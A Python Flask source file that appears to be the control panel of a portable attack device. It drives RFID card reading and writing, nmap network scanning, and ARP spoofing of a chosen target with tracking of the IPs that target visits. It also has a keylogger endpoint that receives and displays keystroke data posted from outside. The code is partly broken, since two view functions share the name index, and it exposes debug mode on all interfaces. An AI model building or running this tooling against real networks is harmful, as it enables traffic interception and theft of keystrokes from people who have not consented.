# app.py

from flask import Flask, render_template, request, jsonify

from rfid_handler import rfid_handler
from nmap_scanner import get_local_ip, get_network_ip, scan_network, scan_open_ports
from arpspoof.arpspoof import Spoofer

import psutil

app = Flask(__name__)

#Sys info
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/system_info', methods=['GET'])
def system_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    pn532_status = rfid_handler.is_connected()

    system_info = {
        "cpu_usage": cpu_usage,
        "memory_total": memory_info.total / (1024**3),
        "memory_used": memory_info.used / (1024**3),
        "memory_free": memory_info.available / (1024**3),
        "memory_usage_percent": memory_info.percent,
        "disk_total": disk_info.total / (1024**3),
        "disk_used": disk_info.used / (1024**3),
        "disk_free": disk_info.free / (1024**3),
        "disk_usage_percent": disk_info.percent,

        "rfid_status": pn532_status,
    }
    return jsonify(system_info)

# RFID/NFC
@app.route('/rfid')
def rfid():
    if not rfid_handler.is_connected():
        return render_template('rfid.html', error="PN532 not connected. Please check the hardware setup.")
    return render_template('rfid.html')

@app.route('/check_connection', methods=['GET'])
def check_connection():
    if rfid_handler.is_connected():
        return jsonify(status="connected")
    else:
        return jsonify(status="disconnected")

@app.route('/start_scan', methods=['POST'])
def start_scan():
    if not rfid_handler.is_connected():
        return jsonify({"status": "error", "message": "RFID scanner is not connected."})
    rfid_handler.start_scanning()
    return jsonify({"status": "success", "message": "Started scanning."})

@app.route('/stop_scan', methods=['POST'])
def stop_scan():
    if rfid_handler.is_connected():
        rfid_handler.stop_scanning()
        return jsonify({"status": "success", "message": "Stopped scanning."})
    else:
        return jsonify({"status": "error", "message": "RFID scanner is not connected."})

@app.route('/get_scan', methods=['GET'])
def get_scan():
    if not rfid_handler.is_connected():
        return jsonify({"status": "error", "message": "RFID scanner is not connected."})
    latest = rfid_handler.get_latest_scan()
    if latest:
        return jsonify({"status": "success", "data": latest})
    else:
        return jsonify({"status": "no_data", "message": "No data scanned yet."})

@app.route('/write', methods=['POST'])
def write_card():
    if not rfid_handler.is_connected():
        return jsonify({"status": "error", "message": "RFID scanner is not connected."})
    data_to_write = request.json.get("data")
    result = rfid_handler.authenticate_and_write(data_to_write, 4)
    if "successfully" in result:
        return jsonify({"status": "success", "message": result})
    else:
        return jsonify({"status": "error", "message": result})


# NMAP
@app.route('/network_scan')
def network_scan():
    return render_template('network_scan.html')

@app.route('/get_ip_info', methods=['GET'])
def get_ip_info():
    local_ip = get_local_ip()
    network_ip = get_network_ip()
    return jsonify({"local_ip": local_ip, "network_ip": network_ip})

@app.route('/scan_network', methods=['POST'])
def scan_network_route():
    results = scan_network()
    return jsonify({"status": "success", "data": results})

@app.route('/scan_open_ports', methods=['POST'])
def scan_ports_route():
    results = scan_open_ports()
    return jsonify({"status": "success", "data": results})

# Spoof
spoofer = None

@app.route('/arp_spoofing')
def arp_spoofing():
    return render_template('arp_spoofing.html')

@app.route('/start_arp_spoofing', methods=['POST'])
def start_arp_spoofing():
    global spoofer
    data = request.json

    if 'target_ip' not in data:
        return jsonify({"status": "error", "message": "Target IP is required."}), 400
    
    target_ip = data['target_ip']
    attacker_mac = data['attacker_mac']
    gateway_mac = data['gateway_mac']
    gateway_ip = data['gateway_ip']
    target_mac = data['target_mac']
    interval = data['interval']
    disassociate = data['disassociate']
    ipforward = data['ipforward']
    
    if spoofer is None:
        spoofer = Spoofer(
            interface='wlan0',
            attackermac=attacker_mac,
            gatewaymac=gateway_mac,
            gatewayip=gateway_ip,
            targetmac=target_mac,
            targetip=target_ip,
            interval=interval,
            disassociate=disassociate,
            ipforward=ipforward
        )
        try:
            spoofer.execute()
            return jsonify({"status": "success", "message": f"ARP spoofing started for IP {target_ip}."})
        except Exception as e:
            print(str(e))
            return jsonify({"status": "error", "message": str(e)})

    return jsonify({"status": "error", "message": "ARP spoofing is already running."})

@app.route('/stop_arp_spoofing', methods=['POST'])
def stop_spoofing():
    global spoofer
    if spoofer:
        spoofer.stop()  # Stop the spoofing
        spoofer = None
        return jsonify({"status": "success", "message": "ARP spoofing stopped."})
    return jsonify({"status": "error", "message": "No spoofing is running."})


@app.route('/current_status', methods=['GET'])
def current_status():
    global spoofer
    if spoofer:
        return jsonify({'isRunning': spoofer.running})

    return jsonify({'isRunning': False})


@app.route('/visited_ips')
def get_visited_ips():
    global spoofer
    if spoofer:
        print(list(spoofer.visited_ips))
        return jsonify(list(spoofer.visited_ips))  # Return IPs as JSON
    return jsonify({"status": "error", "message": "No spoofing is running."})
        
# keylogger
received_data_list = []

@app.route('/show_data')
def index():
    return render_template('keylogger.html', data_list=received_data_list)

@app.route('/get_data')
def get_data():
    return jsonify(received_data_list)

@app.route('/receive_data', methods=['POST'])
def receive_keystroke():
    data = request.get_json()
    
    # Add the received data to our list
    received_data_list.append(data)
    print(f"Received data: {data}")
    print(f"Current data list: {received_data_list}")
    
    return jsonify({
        "message": "Data received successfully",
        "current_list": received_data_list
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

